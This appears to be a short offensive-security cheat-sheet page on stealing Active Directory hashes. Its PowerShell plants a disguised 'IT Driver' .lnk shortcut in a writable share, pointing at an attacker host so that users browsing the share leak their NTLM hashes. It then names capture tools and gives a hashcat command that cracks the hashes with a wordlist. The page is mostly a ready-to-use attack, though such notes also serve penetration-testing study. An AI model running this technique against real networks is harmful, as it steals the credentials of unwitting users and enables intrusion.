---
tags:
  - Initial-Access
  - Lateral-Movement
  - AD
---
Any writable directory (shares, nfs, locally) where users will list contents you can use a .lnk to steal hashes

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("\\DC01.domain.local\OpenShare\IT-Driver.lnk")
$lnk.TargetPath = "\\<AttackerIP>\@ico.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "IT Driver"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
Monitor for traffic with [Responder](https://github.com/SpiderLabs/Responder) on linux or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) on windows. 
Hash received? Try to crack it
```
hashcat -m 5600 userr.hash /usr/share/wordlists/rockyou.txt
```
OR:  [Relay Attacks](../Lateral%20Movement/Relay%20Attacks.md)

